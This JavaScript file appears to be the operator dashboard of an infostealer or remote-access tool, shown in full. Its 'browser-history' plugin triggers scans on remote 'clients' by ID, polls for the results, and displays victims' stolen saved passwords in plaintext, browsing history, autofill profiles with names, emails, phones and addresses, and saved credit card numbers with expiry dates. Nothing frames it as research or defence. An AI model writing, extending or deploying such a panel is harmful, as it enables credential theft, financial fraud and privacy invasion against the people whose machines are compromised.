const params            = new URLSearchParams(window.location.search);
const clientIdInput     = document.getElementById("client-id");
const scanBtn           = document.getElementById("scan-btn");
const statusPill        = document.getElementById("status-pill");
const countBadge        = document.getElementById("count-badge");
const pwdCountBadge     = document.getElementById("pwd-count-badge");
const profileCountBadge = document.getElementById("profile-count-badge");
const cardCountBadge    = document.getElementById("card-count-badge");
const resultsArea       = document.getElementById("results-area");
const passwordsArea     = document.getElementById("passwords-area");
const profilesArea      = document.getElementById("profiles-area");
const cardsArea         = document.getElementById("cards-area");
const logEl             = document.getElementById("log");

const pluginId = "browser-history";

// Try frame URL first, then fall back to parent URL
let clientId = params.get("clientId") || "";
if (!clientId) {
  try { clientId = new URLSearchParams(window.parent.location.search).get("clientId") || ""; } catch (_) {}
}
clientIdInput.value = clientId;

let pollTimer = null;

// ─── Logging ──────────────────────────────────────────────────────────────────

function log(line) {
  const ts = new Date().toISOString();
  logEl.textContent = `${ts}  ${line}\n` + logEl.textContent;
}

// ─── Status pill ──────────────────────────────────────────────────────────────

function setStatus(text, cls) {
  statusPill.textContent = text;
  statusPill.className = "status-pill " + cls;
}

// ─── API helpers ───────────────────────────────────────────────────────────────

async function sendPluginEvent(event, payload) {
  const id = clientIdInput.value.trim() || clientId;
  if (!id) { log("Missing clientId"); return; }
  const res = await fetch(
    `/api/clients/${encodeURIComponent(id)}/plugins/${pluginId}/event`,
    {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ event, payload }),
    }
  );
  if (!res.ok) {
    const text = await res.text();
    log(`sendEvent failed: ${res.status} ${text}`);
  }
}

async function pollEvents() {
  const id = clientIdInput.value.trim() || clientId;
  if (!id) return;
  try {
    const res = await fetch(
      `/api/clients/${encodeURIComponent(id)}/plugins/${pluginId}/events`,
      { method: "GET" }
    );
    if (!res.ok) { log(`poll failed: ${res.status}`); return; }
    const data = await res.json();
    for (const item of data.events || []) {
      handleIncomingEvent(item.event, item.payload);
    }
  } catch (err) {
    log(`poll error: ${err.message}`);
  }
}

// ─── Helpers ──────────────────────────────────────────────────────────────────

function escapeHtml(str) {
  return String(str)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}

function extractDomain(url) {
  try { return new URL(url).hostname.replace(/^www\./, ""); }
  catch (_) { return url; }
}

function groupByFirstLetter(items, keyFn) {
  const groups = {};
  for (const item of items) {
    const letter = (keyFn(item)[0] || "#").toUpperCase();
    if (!groups[letter]) groups[letter] = [];
    groups[letter].push(item);
  }
  return groups;
}

// ─── Render passwords ─────────────────────────────────────────────────────────

function renderPasswords(passwords, total) {
  pwdCountBadge.textContent = String(total);
  pwdCountBadge.classList.toggle("hidden", total === 0);

  if (total === 0) {
    passwordsArea.innerHTML = `<p class="no-wallets">&#x2714; No saved passwords found.</p>`;
    return;
  }

  const groups = groupByFirstLetter(passwords, (p) => extractDomain(p.url));
  const letters = Object.keys(groups).sort();
  let html = "";

  for (const letter of letters) {
    const items = groups[letter];
    const rows = items.map((p) => `<tr>
      <td class="url-cell">${escapeHtml(p.url)}</td>
      <td class="title-cell">${escapeHtml(p.username)}</td>
      <td class="password-cell">${escapeHtml(p.password)}</td>
      <td class="source-cell">${escapeHtml(p.source)}</td>
    </tr>`).join("");

    html += `
      <div class="category-group">
        <div class="category-title cat-pwd">
          <span class="cat-dot"></span>${escapeHtml(letter)} (${items.length})
        </div>
        <table class="wallet-table">
          <thead><tr><th>URL</th><th>Username</th><th>Password</th><th>Browser</th></tr></thead>
          <tbody>${rows}</tbody>
        </table>
      </div>`;
  }

  passwordsArea.innerHTML = html;
}

// ─── Render history ───────────────────────────────────────────────────────────

function renderResults(entries, total) {
  countBadge.textContent = String(total);
  countBadge.classList.toggle("hidden", total === 0);

  if (total === 0) {
    resultsArea.innerHTML = `<p class="no-wallets">&#x2714; No browsing history found on this machine.</p>`;
    return;
  }

  const groups = groupByFirstLetter(entries, (e) => extractDomain(e.url));
  const letters = Object.keys(groups).sort();
  let html = "";

  for (const letter of letters) {
    const items = groups[letter];
    const rows = items.map((e) => `<tr>
      <td class="url-cell"><a href="${escapeHtml(e.url)}" target="_blank" rel="noopener noreferrer">${escapeHtml(e.url)}</a></td>
      <td class="title-cell">${escapeHtml(e.title || "")}</td>
      <td class="source-cell">${escapeHtml(e.source)}</td>
    </tr>`).join("");

    html += `
      <div class="category-group">
        <div class="category-title cat-letter">
          <span class="cat-dot"></span>${escapeHtml(letter)} (${items.length})
        </div>
        <table class="wallet-table">
          <thead><tr><th>URL</th><th>Title</th><th>Browser</th></tr></thead>
          <tbody>${rows}</tbody>
        </table>
      </div>`;
  }

  resultsArea.innerHTML = html;
}

// ─── Render autofill profiles ─────────────────────────────────────────────────

function renderProfiles(profiles, total) {
  profileCountBadge.textContent = String(total);
  profileCountBadge.classList.toggle("hidden", total === 0);

  if (total === 0) {
    profilesArea.innerHTML = `<p class="no-wallets">&#x2714; No autofill profiles found.</p>`;
    return;
  }

  const rows = profiles.map((p) => `<tr>
    <td class="title-cell">${escapeHtml(p.fullName)}</td>
    <td class="title-cell">${escapeHtml(p.email)}</td>
    <td class="title-cell">${escapeHtml(p.phone)}</td>
    <td class="title-cell">${escapeHtml([p.address, p.city, p.state, p.zip, p.country].filter(Boolean).join(", "))}</td>
    <td class="source-cell">${escapeHtml(p.source)}</td>
  </tr>`).join("");

  profilesArea.innerHTML = `
    <div class="category-group">
      <div class="category-title cat-profile">
        <span class="cat-dot"></span>Profiles (${total})
      </div>
      <table class="wallet-table">
        <thead><tr><th>Name</th><th>Email</th><th>Phone</th><th>Address</th><th>Browser</th></tr></thead>
        <tbody>${rows}</tbody>
      </table>
    </div>`;
}

// ─── Render credit cards ──────────────────────────────────────────────────────

function renderCards(cards, total) {
  cardCountBadge.textContent = String(total);
  cardCountBadge.classList.toggle("hidden", total === 0);

  if (total === 0) {
    cardsArea.innerHTML = `<p class="no-wallets">&#x2714; No saved credit cards found.</p>`;
    return;
  }

  const rows = cards.map((c) => `<tr>
    <td class="title-cell">${escapeHtml(c.nameOnCard)}</td>
    <td class="card-number-cell">${escapeHtml(c.number)}</td>
    <td class="title-cell">${escapeHtml(c.expMonth)}/${escapeHtml(c.expYear)}</td>
    <td class="source-cell">${escapeHtml(c.source)}</td>
  </tr>`).join("");

  cardsArea.innerHTML = `
    <div class="category-group">
      <div class="category-title cat-card">
        <span class="cat-dot"></span>Credit Cards (${total})
      </div>
      <table class="wallet-table">
        <thead><tr><th>Name on Card</th><th>Number</th><th>Expiry</th><th>Browser</th></tr></thead>
        <tbody>${rows}</tbody>
      </table>
    </div>`;
}

// ─── Handle incoming events ───────────────────────────────────────────────────

function handleIncomingEvent(event, payload) {
  if (event === "ready") {
    log("Plugin ready on client \u2014 auto-scan started");
    setStatus("Scanning\u2026", "status-scanning");
  } else if (event === "history_result") {
    stopPolling();
    const total        = payload?.total ?? 0;
    const pwdTotal     = payload?.passwordTotal ?? 0;
    const profileTotal = payload?.profileTotal ?? 0;
    const cardTotal    = payload?.cardTotal ?? 0;
    const entries      = payload?.entries ?? [];
    const passwords    = payload?.passwords ?? [];
    const profiles     = payload?.profiles ?? [];
    const cards        = payload?.cards ?? [];
    const scannedAt    = payload?.scannedAt ?? "";

    log(`Scan complete at ${scannedAt} \u2014 ${total} URL(s) \u00B7 ${pwdTotal} password(s) \u00B7 ${profileTotal} profile(s) \u00B7 ${cardTotal} card(s)`);
    setStatus(`${pwdTotal} pwd \u00B7 ${profileTotal} profiles \u00B7 ${cardTotal} cards \u00B7 ${total} URLs`, "status-found");

    renderPasswords(passwords, pwdTotal);
    renderProfiles(profiles, profileTotal);
    renderCards(cards, cardTotal);
    renderResults(entries, total);
    scanBtn.disabled = false;
  } else {
    log(`Event: ${event} \u2192 ${JSON.stringify(payload)}`);
  }
}

// ─── Polling control ──────────────────────────────────────────────────────────

function startPolling() {
  stopPolling();
  pollTimer = setInterval(pollEvents, 2000);
  void pollEvents();
}

function stopPolling() {
  if (pollTimer !== null) { clearInterval(pollTimer); pollTimer = null; }
}

// ─── Scan button ──────────────────────────────────────────────────────────────

scanBtn.addEventListener("click", async () => {
  const id = clientIdInput.value.trim();
  if (!id) { log("No clientId — enter a Client ID first"); return; }
  if (id !== clientId) { clientId = id; }
  scanBtn.disabled = true;
  setStatus("Scanning\u2026", "status-scanning");
  log("Manual scan triggered");
  await sendPluginEvent("scan", {});
  startPolling();
});

// ─── Init ─────────────────────────────────────────────────────────────────────

if (!clientId) {
  log("No clientId provided in URL \u2014 open this page from a client context");
  setStatus("No client selected", "status-idle");
} else {
  log(`Client: ${clientId}`);
  log("Waiting for auto-scan result\u2026");
  setStatus("Awaiting auto-scan\u2026", "status-scanning");
  startPolling();
}
